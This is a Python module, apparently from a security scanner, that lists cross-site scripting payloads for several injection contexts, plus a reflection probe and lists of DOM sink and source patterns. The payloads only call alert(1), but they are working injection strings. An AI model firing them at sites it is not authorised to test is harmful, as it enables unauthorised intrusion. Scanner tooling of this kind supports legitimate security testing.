"""Context-aware XSS payload library (lab-safe: alert/DOM-marker only).

No data-exfiltration, keylogging, or network callbacks — payloads trigger
`alert(1)` / harmless DOM mutations only (architecture.md §6).
"""

from __future__ import annotations

from typing import Dict, List

# Unique marker used to locate reflections reliably.
MARKER = "xptmark777"

PAYLOAD_SETS: Dict[str, List[str]] = {
    "html_body": [
        f"<script>alert(1)//{MARKER}</script>",
        f"<img src=x onerror=alert(1)>",
        f"<svg onload=alert(1)>",
        f"<body onload=alert(1)>",
        f"<iframe src=javascript:alert(1)>",
        f"<details open ontoggle=alert(1)>",
    ],
    "html_attribute": [
        f"\" onmouseover=\"alert(1)\" x=\"",
        f"' onmouseover='alert(1)' x='",
        f"\" onfocus=alert(1) autofocus=\"",
        f"\"><script>alert(1)</script>",
        f"\" onerror=alert(1) src=\"",
    ],
    "js_string": [
        f"';alert(1);//",
        f"\";alert(1);//",
        f"</script><script>alert(1)</script>",
        f"\\';alert(1);//",
        f"`;alert(1);//",
    ],
    "url_param": [
        f"javascript:alert(1)//{MARKER}",
        f"JavaScript&#58;alert(1)",
        f"java\tscript:alert(1)",
    ],
    "css_context": [
        f"background:url(javascript:alert(1))",
        f"expression(alert(1))",
        f"</style><script>alert(1)</script>",
    ],
}

# Probes to detect raw reflection and identify context.
PROBE = f"\"'`<>{MARKER}</xpt\""

# DOM sink patterns (static analysis of inline/external JS).
DOM_SINKS = [
    "innerHTML", "outerHTML", "document.write", "document.writeln",
    "eval(", "setTimeout(", "setInterval(",
    "location.href=", "location.assign(", "insertAdjacentHTML",
    "$.html(", "$(".replace("(", "") + ".append(",
]

DOM_SOURCES = [
    "location.hash", "location.search", "location.href", "document.URL",
    "document.referrer", "window.name", "postMessage",
]


def all_payloads(contexts: List[str], custom: List[str] | None = None) -> List[str]:
    """Flatten payload sets for the chosen contexts + custom payloads."""
    out: List[str] = []
    for ctx in contexts:
        out.extend(PAYLOAD_SETS.get(ctx, []))
    for p in custom or []:
        p = p.strip()
        if p and p not in out:
            out.append(p)
    return out
